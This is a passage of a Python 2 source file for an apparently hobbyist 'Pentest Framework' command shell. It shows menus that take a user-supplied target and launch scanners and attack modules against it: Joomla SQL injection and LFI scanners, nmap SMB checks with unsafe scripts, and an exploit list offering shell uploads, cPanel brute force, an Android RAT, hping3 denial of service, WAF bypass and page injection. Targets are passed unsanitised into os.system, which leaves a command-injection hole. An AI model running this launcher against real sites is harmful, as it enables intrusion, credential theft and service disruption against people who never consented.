        yu = raw_input(""+N+"(Pentest)> ("+B+"modules/scanners)("+R+"scanner/lfi_scanners (set target)"+N+"): ")
        print ""+B+"[*] "+N+"Starting attacks..."
        os.system("cd modules;cd lfi_scanners;perl lfi_scanner.pl")
        print ""+B+"[*]"+N+" Job finished!"
        print
        lfi()
    elif lf == 'clear':
        clean()
        lfi()
    else:
        print "Wrong Command => ", lf
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        lfi()

def port():
    os.system("python modules/port_scanners/port.py")
    print ""+B+"[*]"+N+" Job finished!"
    print
    main()
def joomla_sql():
    jo = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_sqli_scanners"+N+"): ")
    if jo == 'show options':
        option()
        joomla_sql()
    elif jo == 'back':
        main()
    elif jo == 'set target':
        q = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_sqli_scanners (set target)"+N+"): ")
        print "list web => "+R+"",q
        m = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_sqli_scanners"+N+"): ")
        if m == "run":
            print ""+B+"[*] "+N+"Starting attacks..."
            os.system("cd modules;cd joomla_sqli_scanners;python joomsql.py %s" % (q))
            print
            joomla_sql()
        else:
            joomla_sql()
    elif jo == 'clear':
        clean()
        joomla_sql()
    else:
        print "Wrong Command => ", jo
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        joomla_sql()
def joomscan():
    jaa = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/jomscan_v4"+N+"): ")
    if jaa == 'show options':
        option()
        joomscan()
    elif jaa == 'back':
        main()
    elif jaa == 'set target':
        ops = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/jomscan_v4 (target)"+N+"): ")
        print "target => "+R+"",ops
        rup = raw_input(""+N+"(Pentest)> ("+B+"modules/scanners)("+R+"scanner/jomscan_v4"+N+"): ")
        if rup == "run":
            print ""+B+"[*]"+N+" Starting Attacks..."
            os.system("cd modules;cd joomscan_v4;python scan.py %s" % (ops))
            print ""+B+"[*]"+N+" Job finished!"
            print
            joomscan()
        else:
            joomscan()
    elif jaa =='clear':
        clean()
        joomscan()
    else:
        print "Wrong Command => ", jaa
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        joomscan()

def scan_v3():
    se =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"joomla_scanners_v3"+N+"): ")
    if se == 'show options':
        option()
        scan_v3()
    elif se == 'back':
        main()
    elif se == 'set target':
        x = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_scanners_v3 (set target)"+N+"): ")
        print "target => "+R+"",x
        i = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"joomla_scanners_v3"+N+"): ")
        if i == "run":
            time.sleep(2)
            print ""+B+"[*]"+N+" Starting attacks..."
            os.system("cd modules;cd joomscan_v3;python joomlascanner.py %s" % (x))
            print ""+B+"[*]"+N+" Job finished!"
            print
            scan_v3()
        else:
            scan_v3()
    elif se =='clear':
        clean()
        scan_v3()
    else:
        print "Wrong Command => ", se
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        scan_v3()
def scan_v2():
    v2 =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_scanners_v.2"+N+"): ")
    if v2 == 'show options':
        option()
        scan_v2()
    elif v2 == 'back':
        main()
    elif v2 == 'set target':
        p = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_scanners_v.2 (set target)"+N+"): ")
        print "target => "+R+"",p
        o = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_scanners_v.2"+N+"): ")
        if o == "run":
            os.system("cd modules;cd joomscan_v2;python joomlascan2.py %s" % (p))
            print ""+B+"[*]"+N+" Job finished!"
            print
            scan_v2()
        else:
            scan_v2()
    elif v2 =='clear':
        clean()
        scan_v2()
    else:
        print "Wrong Command => ", v2
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        scan_v2()
def jomvull():
    j = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/joomla_vulnerability_scanners"+N+"): ")
    if j == 'show options':
        print "run                   START Attacks"
        jomvull()
    elif j == 'back':
        main()
    elif j == 'run':
        os.system("cd modules;cd joomscan;perl joomlavulnerability.pl")
        print ""+B+"[*]"+N+" Job finished!"
        print
        jomvull()
    elif j =='clear':
        clean()
        jomvull()
    else:
        print "Wrong Command => ", j
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jomvull()
def jdown():
    a = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/jdownloads_scanners"+N+"): ")
    if a == 'show options':
        option()
        jdown()
    elif a == 'back':
        main()
    elif a == 'set target':
        li = raw_input(""+N+"(list)> ("+B+"modules/scanners)("+R+"scanner/jdownloads_scanners (set target)"+N+"): ")
        print "list => "+R+"",li
        ruu = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/jdownloads_scanners"+N+"): ")
        if ruu == "run":
            print ""+B+"[*]"+N+" Starting attacks..."
            os.system("cd modules;cd jdownloads_scanner;perl jdownloads_scanner.pl %s" % (li))
            print ""+B+"[*]"+N+" Job finished!"
            print
            jdown()
        else:
            jdown()
    elif a == 'clear':
        clean()
        jdown()
    else:
        print "Wrong Command => ", a
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jdown()
def smb():
    map =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/smb_scanning"+N+"): ")
    if map == 'show options':
        option()
        smb()
    elif map == 'back':
        main()
    elif map =='set target':
        target = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/smb_scanning ("+G+"set target)"+N+"): ")
        print "Target => "+R+"",target
        ta = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/smb_scanning"+N+"): ")
        if ta  == "run":
          os.system("nmap -v 445 --script=smb-check-vulns --script-args=unsafe=1 %s" % (target))
          smb()
        else:
            smb()
    elif map =='clear':
        clean()
        smb()
    else:
        print "Wrong Command => ", map
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        smb()

def nmap_sc():
    nnn = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner"+N+"): ")
    if nnn == 'show options':
        option()
        nmap_sc()
    elif nnn == 'back':
        main()
    elif nnn =='set target':
         target = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner (set ip)"+N+"): ")
         print "Target => "+R+"",target
         ta = raw_input("Pentest)> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner"+N+"): ")
         if ta  == "run":
           os.system("nmap %s" % (target))
           nmap_sc()
         else:
             nmap_sc()
    elif nnn =='clear':
        clean()
        nmap_sc()
    else:
        print "Wrong Command => ", nnn
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        nmap_sc()

def nmap_vul():
    map =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner"+N+"): ")
    if map == 'show options':
        option()
        nmap_vul()
    elif map == 'back':
        main()
    elif map =='set target':
        target = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner (set IP)"+N+"): ")
        print "Target => "+R+"",target
        ta = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/nmap_scanner"+N+"): ")
        if ta  == "run":
          os.system("nmap -sV --script vuln %s" % (target))
          nmap_vul()
        else:
            nmap_vul()
    elif map =='clear':
        clean()
        nmap_vul()
    else:
        print "Wrong Command => ", map
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        nmap_vul()

def spaghetti():
    map =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/spaghetti"+N+"): ")
    if map == 'show options':
        option()
        spaghetti()
    elif map == 'back':
        main()
    elif map =='set target':
        target = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/spaghetti ("+G+"set target)"+N+"): ")
        print "Target => "+R+"",target
        ta = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/spaghetti"+N+"): ")
        if ta  == "run":
          os.system("python modules/spaghetti/spaghetti.py --url %s --scan [0-3] " % (target))
          spaghetti()
        else:
            spaghetti()
    elif map =='clear':
        clean()
        spaghetti()
    else:
        print "Wrong Command => ", map
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        spaghetti()
def ssl():
    map =raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/ssl_scanning"+N+"): ")
    if map == 'show options':
        option()
        ssl()
    elif map == 'back':
        main()
    elif map =='set target':
        target = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/ssl_scanning ("+G+"set target)"+N+"): ")
        print "Target => "+R+"",target
        ta = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/ssl_scanning"+N+"): ")
        if ta  == "run":
          os.system("python modules/a2sv/a2sv.py -t %s" % (target))
          ssl()
        else:
            ssl()
    elif map =='clear':
        clean()
        ssl()
    else:
        print "Wrong Command => ", map
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        ssl()

##########################################################################
#MODULES
def exploits():
    ex = raw_input(""+N+"Pentest>> ("+B+"modules/exploits"+N+"): ")
    if ex == 'show options':
        print "       name                       Description"
        print "    ----------                  ---------------      "
        print "   show module                show modules/exploits"
        print "   set                        Select module "
        print "   back                       back to menu"
        print
        exploits()
    elif ex == 'show module':
          print ""+N+""
          print " EXPLOITS"
          print " ========"
          print
          print "  Exploit Name                         Rank        Description"
          print "  --------------                      -------     -------------"
          print "  exploit/inject_html                  normal      Inject Html code in all visited webpage"
          print "  exploit/php_thumb_shell_upload       good        php shell uploads"
          print "  exploit/cpanel_bruteforce            normal      cpanel bruteforce"
          print "  exploit/joomla_com_hdflayer          manual      joomla exploit hdflayer"
          print "  exploit/wp_symposium_shell_upload    good        symposium shell upload"
          print "  exploit/joomla0day_com_myngallery    good        exploits com myngallery"
          print "  exploit/jm_auto_change_pswd          normal      vulnerability"
          print "  exploit/android/remote_access        expert      Remote Acces Administrator (RAT)"
          print "  exploit/power_dos                    manual      Denial Of Service"
          print "  exploit/joomla_com_foxcontact        high        joomla foxcontact"
          print "  exploit/joomla_simple_shell          high        joomla simple shell"
          print "  exploit/inject_javascript            normal      Inject Javascript code in all visited webpage"
          print "  exploit/dns_bruteforce               high        Dns Bruteforce with nmap "
          print "  exploit/dos_attack                   normal      hping3 dos attack"
          print "  exploit/shakescreen                  high        Shaking Web Browser content"
          print "  exploit/bypass_waf                   normal      bypass WAf "
          print "  exploit/enumeration                  high        simple enumeration"
          print "  exploit/restrict_anonymous           normal      obtain credentials"
          print
          exploits()
    elif ex == 'back':
        main()
    elif ex  =='set exploit/php_thumb_shell_upload':
         php()
    elif ex == "set exploit/cpanel_bruteforce":
         cpanel()
    elif ex == "set exploit/inject_javascript":
        java()
    elif ex == "set exploit/joomla_com_hdflayer":
        joomla()
    elif ex == "use exploit/wp_symposium_shell_upload":
        shell()
    elif ex == "set exploit/joomla0day_com_myngallery":
        jomday()
    elif ex == "set exploit/joomla_simple_shell":
        jomsi()
    elif ex == "set exploit/joomla_com_foxcontact":
        jomfox()
    elif ex == "set exploit/jm_auto_change_pswd":
        jmauto()
    elif ex == "set exploit/power_dos":
        dos()
    elif ex == "set exploit/android/remote_access":
        android()
    elif ex == "set exploit/dns_bruteforce":
        dns_b()
    elif ex == "set exploit/dos_attack":
        hping3()
    elif ex == "set exploit/inject_html":
        html()
    elif ex == "set exploit/shakescreen":
        shake()
    elif ex == "set exploit/bypass_waf":
        waf()
    elif ex == "set exploit/enumeration":
        enum()
    elif ex =="set exploit/restrict_anonymous":
        res()
    elif ex == 'clear':
        clean()
        exploits()
    else:
        print "Wrong Command => ", ex
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        exploits()

def scanerss():
    sen = raw_input(""+N+"Pentest>> ("+B+"modules/scanners"+N+"): ")
    if sen == 'show options':
        print "       name                       Description"
        print "    ----------                  ---------------      "
        print "   show module                show modules/scanners"
        print "   set                        Select module "
        print "   back                       back to menu"
        print
        scanerss()
    elif sen == 'show module':
          print ""+N+""
          print " SCANNERS"
          print " ========"
          print
          print "  Scanner Name                           Rank        Description"
          print "  --------------                        -------     -------------"
          print "  scanner/ssl_scanning                   good        SSL Vulnerability Scanning"
          print "  scanner/nmap_scanner                   normal      port scanners nmap"
          print "  scanner/smb_scanning                   good        scan vulnerable SMB server"
          print "  scanner/joomla_vulnerability_scanners  high        vulnerability"
          print "  scanner/joomla_scanners_v.2            good        joomla scaning"
          print "  scanner/joomla_scanners_v3             normal      joomla scaning"
          print "  scanner/jomscan_v4                     good        scan joomla"
          print "  scanner/joomla_sqli_scanners           high        vulnerability scanners"
          print "  scanner/lfi_scanners                   good        lfi bug scan"
          print "  scanner/port_scanners                  manual      port scan"
          print "  scanner/dir_search                     high        directory webscan"
          print "  scanner/wordpress_user_scan            good        get wordpress username"
          print "  scanner/cms_war                        high        FULL SCAN ALL WEBSITES"
          print "  scanner/usr_pro_wordpress_auto_find    good        find user pro vulnerability"
          print "  scanner/nmap_vuln                      normal      vulnerability Scanner"
          print "  scanner/xxs_scaner                     normal      Detected vulnerability xss"
          print "  scanner/spaghetti                      high        Web Application Security Scanner"
          print
          scanerss()
    elif sen == 'back':
        main()
    elif sen == "set scanner/usr_pro_wordpress_auto_find":
         wordpress()
    elif sen == "set scanner/cms_war":
         cms()
    elif sen == "set scanner/wordpress_user_scan":
         wordpress_scan()
    elif sen == "set scanner/dir_search":
         dirse()
    elif sen == "set scanner/lfi_scanners":
         lfi()
    elif sen == "set scanner/port_scanners":
         port()
    elif sen == "set scanner/joomla_sqli_scanners":
         joomla_sql()
    elif sen == "set scanner/jomscan_v4":
         joomscan()
    elif sen == "set scanner/joomla_scanners_v3":
         scan_v3()
    elif sen == "set scanner/joomla_scanners_v.2":
         scan_v2()
    elif sen == "set scanner/joomla_vulnerability_scanners":
         jomvull()
    elif sen == "set scanner/jdownloads_scanners":
         jdown()
    elif sen == "set scanner/nmap_scanner":
         nmap_sc()
    elif sen == "set scanner/nmap_vuln":
         nmap_vul()
    elif sen == "set scanner/xxs_scaner":
        xss()
    elif sen == "set scanner/spaghetti":
        spaghetti()
    elif sen == "set scanner/ssl_scanning":
        ssl()
    elif sen =="set scanner/smb_scanning":
        smb()
    elif sen == 'clear':
        clean()
        scanerss()
    else:
        print "Wrong Command => ", sen
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        scanerss()

#MENUIONS
def help():
    print ""+N+""
    print " Global Option"
    print " =============="
    print
    print "  Option Name            Description"
    print "  -------------          ------------------"
    print "  show modules           Look this modules"
    print "  show options           Show Current Options Of Selected Module"
    print "  ipconfig               Network Informasion"
    print "  use                    Select Tipe Module For Use"
    print "  set                    Select Modules For Use"
    print "  run                    Excute modules"
    print "  update                 Update Pentest Framework"
    print "  about                  Informasion Tools"
    print "  clear                  Clean Pentest input/output"
    print "  exit                   Exit the progam"
    print
    main()

def modules():
    print
    print "      modules                               Descriptions"
    print "    ----------                            ----------------"
    print "  modules/exploits                     exploits vulnerability"
    print "  modules/scanners                     scanners vulnerability"
    print

#MAIN
def main():
    try:
        terminal = raw_input("Pentest>> ")
        if terminal == 'use modules/exploits':
            exploits()
        elif terminal == 'use modules/scanners':
            scanerss()
        elif terminal == 'show modules':
            modules()
            main()
        elif terminal =='ipconfig':
            ipconfig()
            main()
        elif terminal =='show options':
            help()
            main()
        elif terminal =='update':
            update()
            main()
        elif terminal =='about':
            info()
            main()
        elif terminal =='clear':
            clean()
            main()
        elif terminal =='exit':
            exit()
        else:
            print "Wrong Command => ", terminal
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            main()
    except(KeyboardInterrupt):
        print("\n[*] (Ctrl + C ) Detected, Trying To Exit ..." )
        print("[*] Thank You For Using Pentest Framework =)" )

if __name__ == "__main__":
    main()
#EOF
